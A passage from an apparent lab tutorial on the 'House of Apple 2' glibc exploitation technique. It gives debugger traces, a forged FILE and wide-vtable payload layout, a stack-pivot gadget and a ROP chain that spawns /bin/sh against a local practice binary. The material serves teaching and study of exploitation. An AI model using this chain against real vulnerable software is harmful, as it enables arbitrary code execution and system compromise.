- `_flags` must not contain `_IO_NO_WRITES` (`0x0008`)
- `_wide_data->_IO_write_base` must be `NULL`

In `_IO_wdoallocbuf`:

- `fp->_wide_data->_IO_buf_base` must be `NULL`
- `_flags` must not contain `_IO_UNBUFFERED` (`0x0002`)

There is one more detail. `_IO_FILE` contains a `_lock` field that glibc dereferences while acquiring and releasing the stream lock. We need to point it to a zero qword value in writable memory, otherwise the stream operation will crash before reaching our call.

## Control flow hijack

Everything is set, let's try again. This time the outer range check passes, and the first indirect call dispatches to `_IO_wfile_overflow`.

```asm
b► 0x7fa6fefee5f6 <fwrite+150>    lea    rdi, [rip + 0x1838e3]           RDI => 0x7fa6ff171ee0 (__io_vtables) ◂— 0
   0x7fa6fefee5fd <fwrite+157>    mov    rax, qword ptr [rbx + 0xd8]     RAX, [0x183cf0e8] => 0x7fa6ff172208 (__io_vtables+808) —▸ 0x7fa6feffc340 (_IO_file_close) ◂— endbr64
   0x7fa6fefee604 <fwrite+164>    mov    r14, qword ptr [rbx + 0xc8]     R14, [0x183cf0d8] => 0
   0x7fa6fefee60b <fwrite+171>    mov    r15, qword ptr [rbx + 0x28]     R15, [0x183cf038] => 0
   0x7fa6fefee60f <fwrite+175>    mov    r12, qword ptr [rbx + 0x20]     R12, [0x183cf030] => 0
   0x7fa6fefee613 <fwrite+179>    mov    rdx, rax                        RDX => 0x7fa6ff172208 (__io_vtables+808) —▸ 0x7fa6feffc340 (_IO_file_close) ◂— endbr64
   0x7fa6fefee616 <fwrite+182>    sub    rdx, rdi                        RDX => 0x328 (0x7fa6ff172208 - 0x7fa6ff171ee0)
   0x7fa6fefee619 <fwrite+185>    cmp    rdx, 0x92f                      0x328 - 0x92f     EFLAGS => 0x297 [ CF PF AF zf SF IF df of iopl:00 ac ]
   0x7fa6fefee620 <fwrite+192>  ✘ ja     fwrite+544                  <fwrite+544>

   0x7fa6fefee626 <fwrite+198>    mov    qword ptr [rbp - 0x38], r9      [0x7fffb620c618] <= 1
   0x7fa6fefee62a <fwrite+202>    mov    rdx, rcx                        RDX => 1
   0x7fa6fefee62d <fwrite+205>    mov    rdi, rbx                        RDI => 0x183cf010 ◂— 0
   0x7fa6fefee630 <fwrite+208>    mov    qword ptr [rbp - 0x30], r8      [0x7fffb620c620] <= 1
   0x7fa6fefee634 <fwrite+212>    mov    qword ptr [rbp - 0x28], rcx     [0x7fffb620c628] <= 1
   0x7fa6fefee638 <fwrite+216>    call   qword ptr [rax + 0x38]      <_IO_wfile_overflow>

```

The forged structure also satisfies the conditions in `_IO_wfile_overflow`. Execution continues into `_IO_wdoallocbuf`.

```asm
b► 0x7fa6feff5110 <_IO_wfile_overflow>        endbr64
   0x7fa6feff5114 <_IO_wfile_overflow+4>      mov    edx, dword ptr [rdi]     EDX, [0x183cf010] => 0
   0x7fa6feff5116 <_IO_wfile_overflow+6>      test   dl, 8                    0 & 8     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff5119 <_IO_wfile_overflow+9>    ✘ jne    _IO_wfile_overflow+352      <_IO_wfile_overflow+352>

   0x7fa6feff511f <_IO_wfile_overflow+15>     push   rbp
   0x7fa6feff5120 <_IO_wfile_overflow+16>     mov    rbp, rsp                        RBP => 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 —▸ 0x7fffb620c710 ◂— ...
   0x7fa6feff5123 <_IO_wfile_overflow+19>     push   rbx
   0x7fa6feff5124 <_IO_wfile_overflow+20>     mov    ebx, esi                        EBX => 0x183cf1f0 ◂— 0x41 /* 'A' */
   0x7fa6feff5126 <_IO_wfile_overflow+22>     sub    rsp, 0x18                       RSP => 0x7fffb620c5d0 (0x7fffb620c5e8 - 0x18)
   0x7fa6feff512a <_IO_wfile_overflow+26>     mov    rcx, qword ptr [rdi + 0xa0]     RCX, [0x183cf0b0] => 0x183cf018 ◂— 0
   0x7fa6feff5131 <_IO_wfile_overflow+33>     mov    rsi, qword ptr [rcx + 0x18]     RSI, [0x183cf030] => 0
   0x7fa6feff5135 <_IO_wfile_overflow+37>     test   dh, 8                           0 & 8     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff5138 <_IO_wfile_overflow+40>   ✘ jne    _IO_wfile_overflow+208      <_IO_wfile_overflow+208>

   0x7fa6feff513e <_IO_wfile_overflow+46>     test   rsi, rsi                        0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff5141 <_IO_wfile_overflow+49>   ✔ je     _IO_wfile_overflow+213      <_IO_wfile_overflow+213>
    ↓
   0x7fa6feff51e5 <_IO_wfile_overflow+213>    mov    qword ptr [rbp - 0x18], rdi     [0x7fffb620c5d8] <= 0x183cf010 ◂— 0
   0x7fa6feff51e9 <_IO_wfile_overflow+217>    call   _IO_wdoallocbuf             <_IO_wdoallocbuf>

```

Finally, the checks in `_IO_wdoallocbuf` pass, and the indirect call at `_IO_wdoallocbuf+55` lands in our `win` function.

```asm
b► 0x7fa6feff3020 <_IO_wdoallocbuf>       endbr64
   0x7fa6feff3024 <_IO_wdoallocbuf+4>     mov    rax, qword ptr [rdi + 0xa0]     RAX, [0x183cf0b0] => 0x183cf018 ◂— 0
   0x7fa6feff302b <_IO_wdoallocbuf+11>    cmp    qword ptr [rax + 0x30], 0       0 - 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff3030 <_IO_wdoallocbuf+16>  ✔ je     _IO_wdoallocbuf+24          <_IO_wdoallocbuf+24>
    ↓
   0x7fa6feff3038 <_IO_wdoallocbuf+24>    push   rbp
   0x7fa6feff3039 <_IO_wdoallocbuf+25>    mov    rdx, rdi              RDX => 0x183cf010 ◂— 0
   0x7fa6feff303c <_IO_wdoallocbuf+28>    mov    rbp, rsp              RBP => 0x7fffb620c5c0 —▸ 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 ◂— ...
   0x7fa6feff303f <_IO_wdoallocbuf+31>    sub    rsp, 0x20             RSP => 0x7fffb620c5a0 (0x7fffb620c5c0 - 0x20)
   0x7fa6feff3043 <_IO_wdoallocbuf+35>    test   byte ptr [rdi], 2     0 & 2     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff3046 <_IO_wdoallocbuf+38>  ✘ jne    _IO_wdoallocbuf+192         <_IO_wdoallocbuf+192>

   0x7fa6feff304c <_IO_wdoallocbuf+44>    mov    rax, qword ptr [rax + 0xe0]     RAX, [0x183cf0f8] => 0x183cf088 ◂— 0xffffffffffffffff
   0x7fa6feff3053 <_IO_wdoallocbuf+51>    mov    qword ptr [rbp - 8], rdi        [0x7fffb620c5b8] <= 0x183cf010 ◂— 0
   0x7fa6feff3057 <_IO_wdoallocbuf+55>    call   qword ptr [rax + 0x68]      <win>
```

While we're here, it is worth looking at the register state immediately before the final indirect call.

```asm
 RAX  0x183cf088 ◂— 0xffffffffffffffff
 RBX  0x183cf1f0 ◂— 0x41 /* 'A' */
 RCX  0x183cf018 ◂— 0
 RDX  0x183cf010 ◂— 0
 RDI  0x183cf010 ◂— 0
 RSI  0
 R8   1
 R9   1
 R10  0
 R11  0x7fa6fefee560 (fwrite) ◂— endbr64
 R12  0
 R13  1
 R14  0
 R15  0
 RBP  0x7fffb620c5c0 —▸ 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 —▸ 0x7fffb620c710 ◂— ...
 RSP  0x7fffb620c5a0 —▸ 0x7fffb620c5e0 ◂— 0x20e21
*RIP  0x7fa6feff3057 (_IO_wdoallocbuf+55) ◂— call qword ptr [rax + 0x68]
──────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on]──────────────────────────────────────────────────────
   0x7fa6feff303f <_IO_wdoallocbuf+31>    sub    rsp, 0x20             RSP => 0x7fffb620c5a0 (0x7fffb620c5c0 - 0x20)
   0x7fa6feff3043 <_IO_wdoallocbuf+35>    test   byte ptr [rdi], 2     0 & 2     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff3046 <_IO_wdoallocbuf+38>  ✘ jne    _IO_wdoallocbuf+192         <_IO_wdoallocbuf+192>

   0x7fa6feff304c <_IO_wdoallocbuf+44>    mov    rax, qword ptr [rax + 0xe0]     RAX, [0x183cf0f8] => 0x183cf088 ◂— 0xffffffffffffffff
   0x7fa6feff3053 <_IO_wdoallocbuf+51>    mov    qword ptr [rbp - 8], rdi        [0x7fffb620c5b8] <= 0x183cf010 ◂— 0
 ► 0x7fa6feff3057 <_IO_wdoallocbuf+55>    call   qword ptr [rax + 0x68]      <win>
        rdi: 0x183cf010 ◂— 0
        rsi: 0
        rdx: 0x183cf010 ◂— 0
        rcx: 0x183cf018 ◂— 0

   0x7fa6feff305a <_IO_wdoallocbuf+58>    cmp    eax, -1
   0x7fa6feff305d <_IO_wdoallocbuf+61>  ? jne    _IO_wdoallocbuf+133         <_IO_wdoallocbuf+133>

   0x7fa6feff305f <_IO_wdoallocbuf+63>    mov    rdx, qword ptr [rbp - 8]
   0x7fa6feff3063 <_IO_wdoallocbuf+67>    mov    rax, qword ptr [rdx + 0xa0]
   0x7fa6feff306a <_IO_wdoallocbuf+74>    mov    rdi, qword ptr [rax + 0x30]
```

Both `RDI` and `RDX` point to the beginning of the controlled `FILE` structure. We do not directly control the first and third argument registers, but we control the memory they point to. Cool!

## Constructing the primitive

The primitive is implemented in [`./exp/house_of_apple2.py`](./exp/house_of_apple2.py). The straightforward approach would be to place a complete `_IO_FILE_plus`, a complete `_IO_wide_data` and a separate fake wide vtable one after another. That would work, but it would also require a rather large buffer.

We can make the payload smaller by overlapping them.

The fake `_IO_wide_data` starts at offset `0x08`, inside the fake `_IO_FILE_plus`. This works because most fields involved in the overlap can remain zero. Conveniently, `_wide_data->_IO_write_base` and `_wide_data->_IO_buf_base` overlap with `_IO_write_base` and `_IO_buf_base` in the `FILE` structure, and both pairs need to be `NULL`.

The important parts of the layout are:

| Payload offset | `_IO_FILE_plus` interpretation | `_IO_wide_data` interpretation    | Value                                            |
| -------------: | ------------------------------ | --------------------------------- | ------------------------------------------------ |
|         `0x00` | `_flags`                       | -                                 | Must not set `_IO_NO_WRITES` or `_IO_UNBUFFERED` |
|         `0x08` | `_IO_read_ptr`                 | Start of fake `_IO_wide_data`     | Zero                                             |
|         `0x20` | `_IO_write_base`               | `_IO_write_base`                  | `NULL`                                           |
|         `0x38` | `_IO_buf_base`                 | `_IO_buf_base`                    | `NULL`                                           |
|         `0x78` | `_old_offset`                  | Start of the fake wide vtable     | Overlapped vtable data                           |
|         `0x88` | `_lock`                        | -                                 | Pointer to a zero value in writable memory       |
|         `0xa0` | `_wide_data`                   | -                                 | `base + 0x08`                                    |
|         `0xd8` | `_IO_FILE_plus` vtable         | -                                 | Position that dispatches to `_IO_wfile_overflow` |
|         `0xe0` | -                              | Fake wide vtable entry at `+0x68` | Address of the arbitrary function                |
|         `0xe8` | -                              | `_wide_vtable`                    | `base + 0x78`                                    |

The last two entries are the key to the arbitrary call. `_wide_vtable` points back into the payload at offset `0x78`. When `_IO_wdoallocbuf` dispatches through `_wide_vtable + 0x68`, it reads the function pointer stored at offset `0xe0`:

```text
wide_vtable       = base + 0x78
wide_vtable+0x68  = base + 0xe0
```

This is where we place the address of the function we want to call.

The outer vtable depends on the operation used to trigger the primitive. For `fwrite`, the dispatch happens through the slot at `+0x38`, so the pointer is adjusted until that slot resolves to `_IO_wfile_overflow`. The implementation also supports `fread` and `fclose` by applying the corresponding dispatch offsets.

With this layout, a single compact buffer contains the fake `FILE` structure, the overlapping `_IO_wide_data`, the fake wide vtable and the final function pointer.

## Stack pivoting

At this point we have an arbitrary-call primitive but our control over the registers is limited. The next step is to pivot the stack into controlled memory and start a ROP chain.

```asm
pwndbg> disass __push___start_context
Dump of assembler code for function __push___start_context:
   0x00007f46729440d0 <+0>:	endbr64
   0x00007f46729440d4 <+4>:	rdsspq rcx
   0x00007f46729440d9 <+9>:	mov    rdx,rsp
   0x00007f46729440dc <+12>:	mov    rsi,QWORD PTR [rdi+0xa0]
   0x00007f46729440e3 <+19>:	lea    rsp,[rsi+0x8]
   0x00007f46729440e7 <+23>:	mov    rsi,QWORD PTR [rdi+0x3b8]
   0x00007f46729440ee <+30>:	mov    rax,QWORD PTR [rdi+0x3b0]
   0x00007f46729440f5 <+37>:	rstorssp QWORD PTR [rax+rsi*1-0x8]
   0x00007f46729440fb <+43>:	saveprevssp
   0x00007f46729440ff <+47>:	call   0x7f4672944106 <__push___start_context+54>
   0x00007f4672944104 <+52>:	jmp    0x7f4672944120 <__start_context>
   0x00007f4672944106 <+54>:	rstorssp QWORD PTR [rcx-0x8]
   0x00007f467294410b <+59>:	saveprevssp
   0x00007f467294410f <+63>:	mov    rsp,rdx
   0x00007f4672944112 <+66>:	ret
End of assembler dump.
```

At `__push___start_context+63` there is a useful `mov rsp, rdx; ret` stack pivot gadget. We already know that `RDX` points to the beginning of our controlled `FILE` structure at the time of the arbitrary call. If we call this gadget, `RSP` moves directly into our fake structure and execution continues from the values stored there. That should give us the start of a ROP chain.

## ROP

One catch, the ROP chain overlaps memory with the fake `FILE` structure, so the field constraints from `_IO_wdoallocbuf` still apply. The first qword overlaps `_flags`, which means its value must not set `_IO_NO_WRITES` (`0x8`). Our first gadget therefore needs an address with bit 3 clear in its least significant byte.

The `ret` gadget at `_nl_archive_subfreeres+96` should do the trick. It is not a `ret` instruction actually present in the original code at that boundary, but it is a valid mid-instruction gadget at that shifted address. Its least significant byte is `0x00`, so placing the address in `_flags` does not set `_IO_NO_WRITES`.

```asm
pwndbg> tele 0x7f4672919d00 1
00:0000│     0x7f4672919d00 (_nl_archive_subfreeres+96) ◂— ret
```

We have two more holes in the chain because `_IO_write_base` and `_IO_buf_base` must remain `NULL`. We can still make those slots useful by consuming them as zero values for preceding `pop` gadgets.

Finally, we cannot overwrite `_lock`, located at offset `0x88`. This leaves us with 17 qwords for the inline ROP chain, which is more than enough to achieve full control of the process.

The ROP layout in `ace.py` is:

```
0x00: _nl_archive_subfreeres+96 # pointer to ret instruction with least significant byte as 0x00
0x08: pop rdi gadget
0x10: "/bin/sh" string in libc
0x18: pop rsi gadget
0x20: 0x0000000000000000	# _IO_write_base as NULL
0x50: address to execve		# call execve("/bin/sh", NULL)
```

```bash
user@8bd829571ffe:/lab/exp$ ./ace.py
[*] '/lab/target'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process '/lab/target': pid 298
libc base: 0x7f5836d6c000
fp @ 0x39b1c010
[*] Switching to interactive mode
 3) fread(i)            8) overwrite_stdout
 4) fclose(i)           9) overwrite_stderr
 5) inspect(i)          0) quit
> slot [0-9]: length: data: $ ls
__pycache__  hijack_fclose.py  hijack_fwrite.py	   io_file_jumps_breakpoints.gdb
ace.py	     hijack_fread.py   house_of_apple2.py
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$
```

We have now achieved arbitrary code execution.

## Conclusion

The interesting part of House of Apple 2 is not only the arbitrary-call primitive, but also how several legitimate pieces of glibc fit together: a validated vtable, the wide-character stream machinery, an unvalidated secondary vtable and a controlled `FILE` structure. Together they allow us to move from an arbitrary call to a stack pivot and finally to arbitrary code execution through ROP.
